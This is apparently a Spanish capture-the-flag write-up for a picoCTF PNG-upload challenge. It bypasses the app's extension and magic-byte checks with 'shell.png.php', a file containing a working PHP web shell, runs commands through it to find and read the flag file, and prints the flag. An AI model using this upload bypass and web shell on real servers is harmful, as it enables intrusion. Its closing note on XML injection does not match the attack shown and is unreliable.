## Descripción  
I found a web app that can help process images: PNG images only!

Additional details will be available after launching your challenge instance.

## Datos de Acceso al Nivel
user: carlosof / kali 
password:

## Solución
- Ingresamos a la pagina web, nos podemos dar cuenta de que la pagina nos pide un que subamos un archivo .png, si lo intenamos con algun otro tipo de archivo, sera rechazado.
- Si en la url, ingresamos a la ruta  `/robots.txt` encontraremos información de una ruta llamada `/instructions.txt` en esta encontreamos el siguiente mensaje.
```
Let's create a web app for PNG Images processing.
It needs to:
Allow users to upload PNG images
	look for ".png" extension in the submitted files
	make sure the magic bytes match (not sure what this is exactly but wikipedia says that the first few bytes contain 'PNG' in hexadecimal: "50 4E 47" )
after validation, store the uploaded files so that the admin can retrieve them later and do the necessary processing.
```
- Hacemos los siguiente en la terminal
```bash
┌──(kali㉿kali)-[~/Desktop]
└─$ curl -i http://atlas.picoctf.net:52863/
HTTP/1.1 200 OK
Date: Mon, 30 Sep 2024 19:00:02 GMT
Server: Apache/2.4.56 (Debian)
X-Powered-By: PHP/8.0.30
Vary: Accept-Encoding
Content-Length: 321
Content-Type: text/html; charset=UTF-8

<!DOCTYPE html>
<html>
<head>
    <title>File Upload Page</title>
</head>
<body>
    <h1>Welcome to my PNG processing app</h1>

    
    <form method="POST" enctype="multipart/form-data">
        <input type="file" name="file" accept=".png">
        <input type="submit" value="Upload File">
    </form>
</body>
</html>

                                                                                                                                                                      
┌──(kali㉿kali)-[~/Desktop]
└─$ gedit shell.png.php &                  

PNG
<?php if(isset($_REQUEST['cmd'])){ echo "<pre>"; $cmd = ($_REQUEST['cmd']); system($cmd); echo "</pre>"; die; }?>

```
- El primer comando es para ver información útil acerca de la pagina, así nos podemos dar cuenta que se uso PHP.
- Con el segundo comando creamos un archivo de tipo shell con la extensión PNG ya que es el único tipo de archivos que admite y al final PHP ya que es el lenguaje en el que se hizo la pagina.
	- Dentro del archivo, al principio escribimos PNG para que de esta manera se reconozca como un archivo .png y no sea rechazado.
- Podemos deducir que hay una carpeta en la que se almacenan las descargas llamada `uploads`, si ingresamos a la siguiente ruta `/uploads/shell.png.php`
- Ahora tenemos que agregar la instrucción a php `?cmd=find / -name *txt 2>/dev/null` y nos mostrara lo siguiente 
```bash
PNG

/usr/lib/python3.9/LICENSE.txt
/usr/local/lib/php/.channels/.alias/pear.txt
/usr/local/lib/php/.channels/.alias/pecl.txt
/usr/local/lib/php/.channels/.alias/phpdocs.txt
/usr/local/lib/php/doc/Archive_Tar/docs/Archive_Tar.txt
/usr/share/perl/5.32.1/Unicode/Collate/allkeys.txt
/usr/share/perl/5.32.1/Unicode/Collate/keys.txt
/usr/share/perl/5.32.1/unicore/Blocks.txt
/usr/share/perl/5.32.1/unicore/NamedSequences.txt
/usr/share/perl/5.32.1/unicore/SpecialCasing.txt
/var/www/html/HFQWKODGMIYTO.txt
/var/www/html/instructions.txt
/var/www/html/robots.txt
```
- Ingresamos a la ruta `/var/www/html/HFQWKODGMIYTO.txt` y obtenemos la bandera.
- /* picoCTF{c3rt!fi3d_Xp3rt_tr1ckst3r_9ae8fb17} */
- De igual manera se puede realizar un `cat` : `http://atlas.picoctf.net:64607/uploads/shell.png.php?cmd=cat%20/var/www/html/HFQWKODGMIYTO.txt` y también se obtiene la bandera.
## Notas Adicionales
La inyección XML es una técnica de ataque en la que un atacante manipula datos XML en una aplicación para explotar vulnerabilidades en el procesamiento de XML. Este tipo de inyección es similar a otras inyecciones, como la inyección SQL, pero se centra en la forma en que se manejan los datos XML.

## Referencias 
https://play.picoctf.org/practice/challenge/445?page=1&search=tricks
https://github.com/backdoorhub/shell-backdoor-list/blob/master/shell/php/simple-shell.php